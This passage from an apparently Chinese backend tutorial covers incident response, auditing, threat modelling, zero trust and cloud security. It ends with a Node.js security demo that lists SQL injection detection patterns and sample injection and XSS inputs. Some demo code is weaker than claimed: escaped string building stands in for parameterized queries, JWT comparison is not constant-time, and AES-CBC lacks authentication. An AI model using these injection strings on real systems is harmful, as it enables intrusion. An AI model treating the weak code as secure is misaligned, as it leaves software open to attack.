- Zeek（Bro）：网络分析框架

## 二十一、应急响应流程

### 21.1 应急响应阶段

1. **准备**：预案、工具、团队、演练
2. **发现**：监控告警、用户报告、外部通报
3. **确认**：确认是否为安全事件，评估严重性
4. **遏制**：隔离受影响系统，阻止扩散
5. **根除**：清除攻击者痕迹，修复漏洞
6. **恢复**：恢复服务，验证安全性
7. **总结**：复盘，改进预案

### 21.2 严重性分级

| 级别 | 描述 | 响应时间 | 示例 |
|------|------|---------|------|
| P0 | 紧急 | 立即 | 大规模数据泄露 |
| P1 | 严重 | 15 分钟 | 系统被入侵 |
| P2 | 高 | 1 小时 | 漏洞被利用 |
| P3 | 中 | 4 小时 | 漏洞未利用 |
| P4 | 低 | 24 小时 | 潜在风险 |

### 21.3 遏制措施

1. 隔离受影响主机（断网）
2. 封禁攻击 IP
3. 重置受影响用户密码/Token
4. 关闭受影响服务
5. 启用备份系统

### 21.4 取证分析

1. 保存内存 dump
2. 保存磁盘镜像
3. 收集网络流量
4. 分析日志
5. 还原攻击路径
6. 评估影响范围

## 二十二、安全审计

### 22.1 审计内容

1. 用户行为审计：谁、何时、做了什么
2. 权限变更审计：角色分配、权限修改
3. 数据访问审计：敏感数据查询/修改
4. 系统配置审计：安全配置变更
5. 管理操作审计：管理员操作记录

### 22.2 审计日志要求

1. 完整性：不可篡改，防删除
2. 时序性：时间戳精确到毫秒
3. 可追溯：关联用户、操作、资源
4. 保留期：至少 6 个月（等保要求）
5. 不可抵赖：用户行为可追溯到本人

### 22.3 合规审计

PCI DSS 审计：支付卡数据安全
SOC 2 审计：服务组织安全控制
等保测评：中国网络安全等级保护
ISO 27001 认证：信息安全管理体系

## 二十三、多语言安全库对比

### 23.1 密码学库

| 语言 | 库 | 功能 |
|------|-----|------|
| Java | JCA/JCE | 内置加密 API |
| Go | crypto | 内置包 |
| Python | cryptography | OpenSSL 封装 |
| Node.js | crypto | 内置模块 |
| Rust | ring | 高性能 |

### 23.2 Web 安全框架

| 语言 | 框架 | 功能 |
|------|------|------|
| Java | Spring Security | 认证授权，CSRF |
| Go | Casbin | 权限控制 |
| Python | Flask-Security | Web 安全 |
| Node.js | Helmet | HTTP 安全头 |
| Rust | Actix-Web | 内置安全中间件 |

### 23.3 安全编码规范

通用原则：
1. 永不信任输入（外部输入必须校验）
2. 最小权限原则
3. 纵深防御
4. 安全默认值
5. 失败安全（fail-safe）
6. 不自己发明密码学算法
7. 敏感数据最小化收集
8. 及时更新依赖

### 23.4 SAST/DAST 工具

SAST（静态分析）：
- Java：SonarQube, FindSecBugs
- Go：Gosec
- Python：Bandit
- Node.js：ESLint security plugin

DAST（动态分析）：
- OWASP ZAP
- Burp Suite
- Acunetix

SCA（组件扫描）：
- Snyk
- OWASP Dependency-Check
- Trivy

## 二十四、安全开发生命周期深入

### 24.1 SDL 阶段详解

**需求阶段**：
- 安全需求评审：识别安全需求
- 风险评估：评估安全风险等级
- 合规检查：确保满足法规要求

**设计阶段**：
- 威胁建模（STRIDE）：识别威胁
- 安全架构评审：认证、授权、加密设计
- 攻击面分析：最小化攻击面

**编码阶段**：
- 安全编码规范：遵循 OWASP 指南
- 代码审查：Security Code Review
- SAST 静态扫描：自动检测漏洞

**测试阶段**：
- DAST 动态扫描：运行时漏洞检测
- 渗透测试：模拟攻击者行为
- 模糊测试（Fuzzing）：异常输入测试

**部署阶段**：
- 安全配置基线：加固配置
- 镜像扫描：容器镜像漏洞扫描
- 密钥管理：密钥不硬编码

**运维阶段**：
- 持续监控：SIEM + IDS
- 漏洞响应：及时修复
- 应急预案：定期演练

### 24.2 STRIDE 威胁建模

| 威胁 | 英文 | 安全属性 | 示例 |
|------|------|---------|------|
| 伪装 | Spoofing | 认证 | 冒充他人身份 |
| 篡改 | Tampering | 完整性 | 修改数据 |
| 否认 | Repudiation | 不可抵赖 | 否认操作 |
| 信息泄露 | Info Disclosure | 机密性 | 数据泄露 |
| 拒绝服务 | DoS | 可用性 | 使服务不可用 |
| 权限提升 | Elevation | 授权 | 获取未授权权限 |

### 24.3 威胁建模流程

1. 绘制系统架构图（数据流图 DFD）
2. 识别信任边界
3. 对每个组件应用 STRIDE
4. 评估风险（影响 × 概率）
5. 制定缓解措施
6. 验证缓解有效性

## 二十五、零信任架构

### 25.1 零信任原则

1. **永不信任，始终验证**：不因在网络内部就信任
2. **最小权限**：只授予必要的最小权限
3. **持续验证**：每次访问都验证身份和权限
4. **微分段**：细粒度的网络分段
5. **假设已被入侵**：设计时假设攻击者已在内部

### 25.2 零信任架构组件

1. **策略引擎（PE）**：决策是否允许访问
2. **策略执行点（PEP）**：执行访问控制
3. **信任评估**：基于用户、设备、位置、行为评估信任度
4. **身份提供商（IdP）**：统一身份管理

### 25.3 零信任实现

Google BeyondCorp：
- 每次访问都验证设备和用户
- 不依赖 VPN，直接通过代理访问
- 基于设备状态和用户身份动态授权

实现技术：
- mTLS 双向认证
- 设备健康检查
- 持续身份验证
- 细粒度授权策略

## 二十六、云安全

### 26.1 云安全责任共担模型

| 层次 | IaaS | PaaS | SaaS |
|------|------|------|------|
| 数据 | 客户 | 客户 | 客户 |
| 应用 | 客户 | 客户 | 云商 |
| 运行时 | 客户 | 云商 | 云商 |
| 操作系统 | 客户 | 云商 | 云商 |
| 网络 | 共担 | 云商 | 云商 |
| 基础设施 | 云商 | 云商 | 云商 |

### 26.2 容器安全

1. **镜像安全**：使用可信基础镜像，扫描漏洞
2. **运行时安全**：非 root 用户，只读文件系统
3. **网络安全**：NetworkPolicy 限制流量
4. **密钥管理**：不硬编码，使用 K8s Secret 或 Vault
5. **RBAC**：最小权限

### 26.3 Kubernetes 安全

1. **集群安全**：API Server TLS，etcd 加密
2. **Pod 安全**：PodSecurityPolicy/Standards
3. **网络策略**：NetworkPolicy 限制 Pod 间通信
4. **RBAC**：Role/ClusterRole 权限控制
5. **审计日志**：记录所有 API 操作

### 26.4 多语言云安全 SDK

Java：Spring Security + Spring Cloud Security
Go：go-oidc（OIDC 客户端）
Python：boto3（AWS SDK 安全配置）
Node.js：@aws-sdk（AWS SDK 安全配置）

## 二十七、多语言安全最佳实践

### 27.1 Java 安全

1. 使用 Spring Security 做认证授权
2. PreparedStatement 防 SQL 注入
3. OWASP ESAPI 做输出编码
4. KeyStore 管理密钥
5. SecurityManager（已废弃，用模块化替代）

### 27.2 Go 安全

1. crypto/tls 做 HTTPS
2. database/sql 参数化查询
3. html/template 自动转义
4. jwt-go 做 JWT
5. casbin 做权限控制

### 27.3 Python 安全

1. Flask-Security / Django 安全中间件
2. SQLAlchemy 参数化查询
3. Jinja2 自动转义
4. cryptography 库做加密
5. pyjwt 做 JWT

### 27.4 Node.js 安全

1. Helmet 设置安全 HTTP 头
2. parameterized query（mysql2/pg）
3. express-validator 输入校验
4. jsonwebtoken 做 JWT
5. bcrypt/scrypt 做密码哈希

### 27.5 安全检查清单

**开发阶段**：
- [ ] 输入校验（白名单）
- [ ] 输出编码（防 XSS）
- [ ] 参数化查询（防 SQL 注入）
- [ ] 密码哈希存储（bcrypt/scrypt/argon2）
- [ ] 敏感数据加密（AES/RSA）
- [ ] HTTPS 强制
- [ ] CSRF Token
- [ ] 限流防 DoS

**部署阶段**：
- [ ] 安全配置基线
- [ ] 密钥不硬编码
- [ ] 最小权限
- [ ] 日志审计
- [ ] 漏洞扫描
- [ ] WAF 防护

**运维阶段**：
- [ ] 监控告警
- [ ] 定期渗透测试
- [ ] 依赖更新
- [ ] 应急预案
- [ ] 备份恢复

---

### 27.5 安全运营与事件响应（SecOps）

安全不是一次性建设，而是持续运营。安全运营（SecOps）将安全融入日常运维。

#### 1. 安全运营中心（SOC）

SOC 是安全监控与响应的中枢，核心组件：
- **SIEM（安全信息与事件管理）**：聚合日志、关联分析、告警
  - 开源：ELK + ElastAlert、Wazuh
  - 商业：Splunk、QRadar
- **SOAR（安全编排自动化响应）**：自动化处置剧本（Playbook）
- **威胁情报（CTI）**：接入 IOC（IP/域名/Hash 黑名单）实时比对

#### 2. 事件响应流程（NIST SP 800-61）

1. **准备**：制定应急预案、组建 CSIRT 团队、演练
2. **检测与分析**：通过告警/日志发现异常，确认是否为真实事件
3. **遏制**：隔离受影响系统，防止扩散（如下线服务器、封禁 IP）
4. **根除**：清除恶意代码、修复漏洞、重置凭据
5. **恢复**：从干净备份恢复业务，验证完整性
6. **总结**：复盘报告，改进流程与防御

#### 3. 常见安全事件处置

| 事件类型 | 检测信号 | 紧急处置 |
|---------|---------|---------|
| DDoS 攻击 | 流量突增、延迟飙升 | 接入高防 IP、流量清洗 |
| 数据泄露 | 异常大批量查询、外发流量 | 切断外联、审计日志、通报 |
| 账号被盗 | 异地登录、异常操作 | 强制下线、重置密码、二次验证 |
| 挖矿木马 | CPU 100%、可疑进程 | 隔离主机、清除定时任务、查入侵路径 |
| 0day 利用 | WAF 异常、RCE 特征 | 临时补丁、WAF 规则、下线受影响接口 |

#### 4. 漏洞管理生命周期

1. **发现**：外部报告（SRC/众测）、内部扫描（SAST/DAST）、依赖扫描（SCA）
2. **评估**：CVSS 评分定级（Critical/High/Medium/Low）
3. **修复**：Critical 24h、High 7d、Medium 30d、Low 90d
4. **验证**：复测确认修复有效
5. **闭环**：归档、统计修复率、纳入 KPI

#### 5. 备份与灾难恢复

安全最后一道防线是备份，勒索病毒面前尤为关键：
- **3-2-1 原则**：3 份副本、2 种介质、1 份离线
- **异地容灾**：核心数据跨地域备份
- **定期演练**：每季度做一次恢复演练，验证可用性
- **不可变备份**：WORM（Write Once Read Many）存储，防止勒索病毒加密备份

#### 6. 合规与隐私

- **国内**：网络安全法、数据安全法、个人信息保护法（PIPL）、等保 2.0
- **国际**：GDPR（欧盟）、CCPA（加州）、SOC 2、ISO 27001
- **数据出境**：用户数据原则上境内存储，出境需安全评估
- **隐私计算**：联邦学习、多方安全计算（MPC）、差分隐私，实现"数据可用不可见"

---

> 至此，后端开发综合教程的分布式与工程化分组第一批 5 章内容全部完成。掌握这些知识，你就具备了构建安全可靠分布式后端系统的理论基础和实战能力。`,
    code: `// ============================================================
// 安全防护实战 —— 安全工具集
// 实现：SQL 注入检测 + XSS 过滤 + CSRF Token + 密码哈希 +
//       JWT 签发验证 + AES 加解密 + 签名防重放 + RBAC 权限
// ============================================================

const crypto = require('crypto');

// ---------- 1. SQL 注入检测 + 参数化查询模拟 ----------
class SqlInjectionGuard {
  // 检测恶意输入模式
  static detect(input) {
    const patterns = [
      /'(\\s|--|;|#)/i,        // 引号+注释/分号
      /union\\s+select/i,       // UNION 注入
      /or\\s+1=1/i,             // OR 永真
      /drop\\s+table/i,         // 删表
      /insert\\s+into/i,        // 插入
      /<script/i,               // 脚本注入
    ];
    for (const p of patterns) {
      if (p.test(input)) return { safe: false, pattern: p.source };
    }
    return { safe: true };
  }

  // 参数化查询模拟（安全）
  static safeQuery(template, params) {
    // 把 ? 替换为转义后的参数值
    return template.replace(/\\?/g, () => {
      const v = params.shift();
      if (typeof v === 'string') return "'" + v.replace(/'/g, "''") + "'";
      return String(v);
    });
  }
}

// ---------- 2. XSS 过滤器 ----------
class XssFilter {
  static encode(input) {
    const map = { '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;', "'": '&#39;' };
    return String(input).replace(/[<>&"']/g, c => map[c]);
  }
}

// ---------- 3. CSRF Token ----------
class CsrfProtection {
  constructor() { this.tokens = new Map(); }
  generate(sessionId) {
    const token = crypto.randomBytes(32).toString('hex');
    this.tokens.set(sessionId, token);
    return token;
  }
  verify(sessionId, token) {
    return this.tokens.get(sessionId) === token;
  }
}

// ---------- 4. 密码哈希（scrypt 加盐） ----------
class PasswordHasher {
  static hash(password) {
    const salt = crypto.randomBytes(16);
    const hash = crypto.scryptSync(password, salt, 64, { N: 16384 });
    return salt.toString('hex') + ':' + hash.toString('hex');
  }
  static verify(password, stored) {
    const [saltHex, hashHex] = stored.split(':');
    const salt = Buffer.from(saltHex, 'hex');
    const hash = Buffer.from(hashHex, 'hex');
    const computed = crypto.scryptSync(password, salt, 64, { N: 16384 });
    return crypto.timingSafeEqual(hash, computed);
  }
}

// ---------- 5. JWT 签发与验证（HMAC-SHA256） ----------
class JwtUtil {
  constructor(secret) { this.secret = secret; }
  sign(payload, expiresInSeconds = 3600) {
    const header = { alg: 'HS256', typ: 'JWT' };
    const data = {
      ...payload,
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + expiresInSeconds,
    };
    const enc = (o) => Buffer.from(JSON.stringify(o)).toString('base64url');
    const h = enc(header), p = enc(data);
    const sig = crypto.createHmac('sha256', this.secret).update(h + '.' + p).digest('base64url');
    return h + '.' + p + '.' + sig;
  }
  verify(token) {
    const [h, p, sig] = token.split('.');
    const expectedSig = crypto.createHmac('sha256', this.secret).update(h + '.' + p).digest('base64url');
    if (sig !== expectedSig) return { valid: false, reason: '签名无效' };
    const data = JSON.parse(Buffer.from(p, 'base64url').toString());
    if (data.exp < Math.floor(Date.now() / 1000)) return { valid: false, reason: '已过期' };
    return { valid: true, payload: data };
  }
}

// ---------- 6. AES 加解密 ----------
class AesCrypto {
  constructor(key) { this.key = Buffer.from(key.padEnd(32).slice(0, 32)); }
  encrypt(plaintext) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', this.key, iv);
    const enc = Buffer.concat([cipher.update(plaintext, 'utf8'), cipher.final()]);
    return iv.toString('hex') + ':' + enc.toString('hex');
  }
  decrypt(ciphertext) {
    const [ivHex, dataHex] = ciphertext.split(':');
    const decipher = crypto.createDecipheriv('aes-256-cbc', this.key, Buffer.from(ivHex, 'hex'));
    return Buffer.concat([decipher.update(Buffer.from(dataHex, 'hex')), decipher.final()]).toString('utf8');
  }
}

// ---------- 7. 签名与时间戳防重放 ----------
class ApiSigner {
  constructor(secret) { this.secret = secret; this.usedNonces = new Set(); }

  sign(params, timestamp, nonce) {
    const sorted = Object.keys(params).sort().map(k => k + '=' + params[k]).join('&');
    const raw = sorted + '&timestamp=' + timestamp + '&nonce=' + nonce;
    return crypto.createHmac('sha256', this.secret).update(raw).digest('hex');
  }

  verify(params, timestamp, nonce, signature, maxAgeSec = 300) {
    // 1. 时间戳校验
    const now = Math.floor(Date.now() / 1000);
    if (Math.abs(now - timestamp) > maxAgeSec) return { valid: false, reason: '时间戳过期' };
    // 2. nonce 防重放
    if (this.usedNonces.has(nonce)) return { valid: false, reason: '重复请求' };
    // 3. 签名校验
    const expected = this.sign(params, timestamp, nonce);
    if (expected !== signature) return { valid: false, reason: '签名错误' };
    this.usedNonces.add(nonce);
    return { valid: true };
  }
}

// ---------- 8. RBAC 权限校验 ----------
class RbacGuard {
  constructor() {
    this.rolePermissions = {
      'admin': ['read', 'write', 'delete', 'manage'],
      'user': ['read', 'write'],
      'guest': ['read'],
    };
  }
  check(userRole, requiredPermission) {
    const perms = this.rolePermissions[userRole] || [];
    return perms.includes(requiredPermission);
  }
}

// ============================================================
// 演示
// ============================================================

console.log('========== 1. SQL 注入检测 ==========');
const inputs = ["admin", "admin' --", "x' UNION SELECT * FROM users --", "1 OR 1=1"];
inputs.forEach(inp => {
  const r = SqlInjectionGuard.detect(inp);
  console.log(\`  输入: "\${inp}" → \${r.safe ? '安全' : '危险(' + r.pattern + ')'}\`);
});
console.log('参数化查询:', SqlInjectionGuard.safeQuery('SELECT * FROM users WHERE name = ?', ["admin' --"]));

console.log('\\n========== 2. XSS 过滤 ==========');
const xssInput = '<script>alert("xss")</script>';
console.log('原始:', xssInput);
console.log('过滤后:', XssFilter.encode(xssInput));

console.log('\\n========== 3. CSRF Token ==========');
const csrf = new CsrfProtection();
const tk = csrf.generate('session-001');
console.log('生成 Token:', tk.substring(0, 16) + '...');
console.log('正确 Token 校验:', csrf.verify('session-001', tk));
console.log('错误 Token 校验:', csrf.verify('session-001', 'wrong'));

console.log('\\n========== 4. 密码哈希（scrypt） ==========');
const pwd = 'myPassword123';
const hashed = PasswordHasher.hash(pwd);
console.log('密码:', pwd);
console.log('哈希:', hashed.substring(0, 40) + '...');
console.log('正确密码校验:', PasswordHasher.verify(pwd, hashed));
console.log('错误密码校验:', PasswordHasher.verify('wrong', hashed));

console.log('\\n========== 5. JWT 签发验证 ==========');
const jwt = new JwtUtil('my-secret-key');
const token = jwt.sign({ userId: 1001, role: 'admin' });
console.log('JWT:', token.substring(0, 50) + '...');
const verified = jwt.verify(token);
console.log('验证结果:', JSON.stringify(verified));

console.log('\\n========== 6. AES 加解密 ==========');
const aes = new AesCrypto('my-aes-key');
const plain = '这是一段敏感数据 { "card": "6222000123456789" }';
const encrypted = aes.encrypt(plain);
console.log('明文:', plain);
console.log('密文:', encrypted.substring(0, 50) + '...');
console.log('解密:', aes.decrypt(encrypted));

console.log('\\n========== 7. API 签名防重放 ==========');
const signer = new ApiSigner('api-secret');
const params = { userId: 1001, action: 'transfer', amount: 100 };
const ts = Math.floor(Date.now() / 1000);
const nonce = crypto.randomBytes(8).toString('hex');
const sig = signer.sign(params, ts, nonce);
console.log('签名:', sig.substring(0, 20) + '...');
console.log('首次验证:', JSON.stringify(signer.verify(params, ts, nonce, sig)));
console.log('重放验证:', JSON.stringify(signer.verify(params, ts, nonce, sig)));

console.log('\\n========== 8. RBAC 权限校验 ==========');
const guard = new RbacGuard();
console.log('admin 删除:', guard.check('admin', 'delete'));
console.log('user 删除:', guard.check('user', 'delete'));
console.log('user 读取:', guard.check('user', 'read'));
console.log('guest 写入:', guard.check('guest', 'write'));

console.log('\\n=== 安全工具集演示完成 ===');
`,
  },
];
